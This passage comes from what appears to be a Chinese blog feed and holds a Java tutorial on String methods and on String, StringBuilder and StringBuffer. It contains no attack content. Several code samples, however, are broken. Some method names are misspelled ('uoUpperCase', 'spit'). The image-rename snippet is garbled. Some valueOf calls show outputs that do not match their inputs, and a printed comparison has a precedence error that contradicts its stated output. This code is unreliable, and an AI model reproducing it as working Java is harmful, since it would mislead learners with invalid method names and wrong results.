false，因为又创建了新对象</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s1 == s3 ? "</span> <span class="token operator">+</span> s1 <span class="token operator">==</span> s3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 false</span><span class="token class-name">String</span> s4 <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">+</span> <span class="token string">"bc"</span><span class="token punctuation">;</span><span class="token comment">//JVM 会将代码优化：JVM 看到的是 "abc",该字符串常量池已存在，所以直接使用即可</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s1 == s4 ? "</span> <span class="token operator">+</span> s1 <span class="token operator">==</span> s4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 true</span><span class="token class-name">String</span> s5 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">;</span><span class="token class-name">String</span> s6 <span class="token operator">=</span> s5 <span class="token operator">+</span> <span class="token string">"bc"</span><span class="token punctuation">;</span><span class="token comment">//这里 JVM 则不会优化，所以不会使用常量池中的 "abc"</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"s2 == s6 ? "</span> <span class="token operator">+</span> s2 <span class="token operator">==</span> s6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## String 常用方法 ##String 类中提供了很多方法，这里只介绍几个最常用的方法，更多的方法使用请查看 Java API 文档。<h3 id="equals-方法"><a href="#equals-方法" class="headerlink" title="equals 方法"></a>equals 方法</h3><p>由于字符串是引用类型，所以用 “==” 判断的是该引用类型的内存地址是否相等，若想要检测两个字符串的值是否相等时，则使用 equals 方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">strA<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>strB<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断 strA 的值是否等于 strB 的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>strA 与 strB 可以使字符串变量，也可以是字符串常量。<br>判断字符串的值是否相等建议不要使用 “==”，除非确实要查看存放地址是否相同。</p></blockquote><br>### length 方法String 在内存中采用 Unicode 编码，每个字符占用 2 个字节，任何一个字符（无论是中文还是英文）都算一个长度。可以使用 length 方法查看字符串的长度。<pre class="line-numbers language-java" data-language="java"><code class="language-java">字符串类型变量<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回 int 类型</span><span class="token class-name">String</span> str1 <span class="token operator">=</span><span class="token string">"一二三四五"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 5</span><span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### indexOf 方法 ###indexOf 方法用来查找字符串位置，未找到则返回 -1。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> <span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在字符串中检测给定字符串 str，第一次出现的位置。</span><span class="token keyword">int</span> <span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> fromIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在字符串中的第 fromIndex 位置（包含）开始检索给定字符串 str 的位置。</span><span class="token keyword">int</span> <span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回 str 出现在字符串中最后一次的位置。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"1234567654321"</span><span class="token punctuation">;</span><span class="token keyword">int</span> index <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//index = 0,因为字符串底层是数组，数组下标从 0 开始</span>index <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//index = -1，因为没找到</span>index <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//index = 12</span>index <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//index = 12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### substring 方法substring 方法可以从一个较大的字符串中提取一个子串。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">substring</span><span class="token punctuation">(</span><span class="token keyword">int</span> beginIndex<span class="token punctuation">,</span> <span class="token keyword">int</span> endIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回从 beginIndex 位置(包含)开始到 endIndex 位置(不包含)结束的字符串</span><span class="token class-name">String</span> <span class="token function">substring</span><span class="token punctuation">(</span><span class="token keyword">int</span> beginIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回从 beginIndex 位置开始到结尾的字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> host <span class="token operator">=</span><span class="token string">"www.oracle.com.cn "</span><span class="token punctuation">;</span><span class="token class-name">String</span> sub <span class="token operator">=</span> host<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//sub = "oracle.com.cn "; </span>sub <span class="token operator">=</span> host<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//sub = "oracle";截取字符串第 4 位到第 10 位之间的字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>Java API 中有一个特点：使用两个数表示范围时，含头不含尾</strong></p></blockquote><br>### trim 方法trim 方法去除字符串前后的空字符（**不能去除中间的空白字符**）<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>host<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 18</span><span class="token class-name">String</span> trim <span class="token operator">=</span> host<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//trim = "www.oracle.com.cn";</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>trim<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出 17</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>### charAt 方法charAt 方法返回字符串中指定位置的字符<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">char</span> <span class="token function">charAt</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返字符串中第 index 个字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>### startsWith 和 endsWith 方法检测一个字符串是否以指定的字符串开头或结尾<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> <span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token class-name">String</span> prefix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//字符串是否以指定字符串开头</span><span class="token keyword">boolean</span> <span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token class-name">String</span> suffix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//字符串是否以指定字符串结尾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>### toUpperCase 和 toLowerCase 方法将字符串中的英文转换成大写或小写<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> <span class="token function">uoUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串英文转换为大写</span><span class="token class-name">String</span> <span class="token function">uoLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串英文转换为小写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>### valueOf 方法将其他类型转换成字符串类型（有若干重载方法）<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>各种类型 a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">double</span> pi <span class="token operator">=</span> <span class="token number">3.1419526</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> falg <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> charArr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'c'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>str1 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"123"</span>str2 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"3.1415926"</span>str3 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"false"</span>str4 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"abc"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 根据正则表达式操作字符串的方法<h4 id="matchs-方法："><a href="#matchs-方法：" class="headerlink" title="matchs 方法："></a>matchs 方法：</h4><p>将一个字符串与<a href="/2017/03/15/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a>进行匹配，成功返回 true，否则返回 false，格式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">boolean</span> <span class="token function">matches</span><span class="token punctuation">(</span><span class="token class-name">String</span> regex<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>邮箱正则表达式 <code>[a-zA-Z0-9_]+@[a-zA-Z0-9_]+(.[a-zA-Z]+)+</code> 示例:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> regex <span class="token operator">=</span> <span class="token string">"[a-zA-Z0-9_]+@[a-zA-Z0-9_]+(\\.[a-zA-Z]+)+"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以看到输出了我们想要的正则表达式</span><span class="token class-name">String</span> email <span class="token operator">=</span> <span class="token string">"bao_456@163.c0m"</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> b <span class="token operator">=</span> email<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>email <span class="token operator">+</span> <span class="token punctuation">(</span>b<span class="token operator">?</span><span class="token string">"是个邮箱"</span><span class="token operator">:</span><span class="token string">"邮箱不合法"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出不合法</span><span class="token class-name">String</span> email <span class="token operator">=</span> <span class="token string">"bao_456@163.com"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>email <span class="token operator">+</span> <span class="token punctuation">(</span>b<span class="token operator">?</span><span class="token string">"是个邮箱"</span><span class="token operator">:</span><span class="token string">"邮箱不合法"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出合法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>因为在正则表达式中“.”表示任意字符，为了让它单纯的表示一个“.”,所以需要转义“\.”</strong><br><strong>又因为在 Java 中“\”有特殊含义，所以还需要用“\\”表示“\”</strong></p></blockquote><br>#### spit 方法：以 regex 表达式进行分割，将字符串分割成字符串数组，格式：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">spit</span><span class="token punctuation">(</span><span class="token class-name">String</span> regex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"abc123def456jk1789"</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"[0-9]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//单个字符</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结尾的三个空白字符被忽略</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>按照数字进行拆分，当字符串中连续匹配上两个，那么中间会拆分一个空字符<br>但是在字符串末尾连续匹配所有被拆分的空字符串被忽略</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"abc123def456jk1789"</span><span class="token punctuation">;</span>arr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"[0-9]+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//多个个字符</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图片重命名示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> imageName <span class="token operator">=</span> <span class="token string">"1.jpg"</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> imageName<span class="token punctuation">.</span>splitimageName <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> arr<span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当然也可以不用正则表达式重命名：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">imageName <span class="token operator">=</span> <span class="token string">"1.2.3.jpg"</span><span class="token punctuation">;</span><span class="token keyword">int</span> index <span class="token operator">=</span> imageName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> ends <span class="token operator">=</span> imageName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>imageNmae <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> ends<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>imageName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>#### replaceAll 方法：将字符串中匹配正则表达式的字符串全部替换为新的字符串，格式：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token class-name">String</span> regex<span class="token punctuation">,</span> <span class="token class-name">String</span> str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>敏感字符屏蔽示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"123abc456jk1789mmm"</span><span class="token punctuation">;</span>str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"[0-9]+"</span><span class="token punctuation">,</span><span class="token string">"***"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 “***abc***jk***mmm”</span>regex <span class="token operator">=</span> <span class="token string">"(tm|sb|mmp|jb|qnmlgb)"</span><span class="token punctuation">;</span><span class="token class-name">String</span> message <span class="token operator">=</span> <span class="token string">"你这个 sb，qnmlgb，就是个 jb"</span><span class="token punctuation">;</span>message <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span>regex<span class="token punctuation">,</span><span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## String 、StringBuilder 和 StringBuffer由于 String 的设计不适合频繁修改内容，所以 Java 提供了专门用来修改字符串内容的类：StringBuffer 和 StringBuilder，其提供编译字符串内容的相关方法，这两个类在修改字符串时的性能很好。<p>例如，同样循环修改 100000 次,三者耗时对比：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>str <span class="token operator">+=</span> <span class="token string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">long</span> costTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"String 用时 "</span> <span class="token operator">+</span> costTime <span class="token operator">+</span> <span class="token string">" 毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//需要好几千毫秒，修改字符串性能开销很大，并且容易造成内存泄漏</span>startTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> sbuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sbuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>costTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"StringBuilder 用时 "</span> <span class="token operator">+</span> costTime <span class="token operator">+</span> <span class="token string">" 毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//性能明显高于修改 String,在我的电脑上耗时 0 毫秒</span>startTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuffer</span> sbuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>sbuffer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>costTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"StringBuffer 用时 "</span> <span class="token operator">+</span> costTime <span class="token operator">+</span> <span class="token string">" 毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//性能也明显高于直接修改 String，在我的电脑上耗时 15 毫秒，比 StringBuilder 稍慢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### StringBuilder 与 StringBuffer 的常用方法<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//追加字符串</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>向指定字符串位置插入字符串<span class="token function">delete</span><span class="token punctuation">(</span><span class="token keyword">int</span> star<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除指定位置的字符串</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">,</span> <span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将指定位置的字符串替换成给定的字符串 str</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反转字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>以上方法返回值都是 StringBuilder 或 StringBuffer</p></blockquote><br>### String, StringBuffer 和 StringBuilder 区别：- String 及 StringBuffer, StringBuilder 都是 java.lang 包下面的。- String 是不可变的，StringBuffer 及 StringBuilder 是可变的。- StringBuilder 是线程不安全的，并发处理，性能比 StringBuffer 稍快- StringBuffer 是线程安全的，同步处理的，性能比 StringBuilder 稍慢]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> String </tag>
            
            <tag> StringBuilder </tag>
            
            <tag> StringBuffer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 系统几个常用命令的安装</title>
      <link href="/2017/03/11/mac-xi-tong-ji-ge-chang-yong-ming-ling-de-an-zhuang/"/>
      <url>/2017/03/11/mac-xi-tong-ji-ge-chang-yong-ming-ling-de-an-zhuang/</url>
      
